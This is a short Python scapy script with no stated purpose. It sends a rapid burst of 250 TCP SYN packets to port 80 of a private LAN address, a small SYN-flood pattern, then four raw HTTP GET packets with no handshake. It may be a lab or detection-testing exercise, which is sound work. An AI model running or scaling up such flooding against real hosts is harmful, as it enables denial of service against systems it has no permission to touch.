from scapy.all import *
from scapy.layers.inet import IP,TCP
def get_local_ip():
    """
    Detects the primary local IP address of this machine.
    Connects to an external IP (doesn't send data) to find the routing interface.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip

target = "192.168.1.15"
send(IP(dst=target)/TCP(dport=80, flags="S"), count=250,inter=0.001)

for i in range(4):
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n"
    send(IP(dst=target)/TCP(dport=80, flags="PA")/Raw(load=payload), inter=5)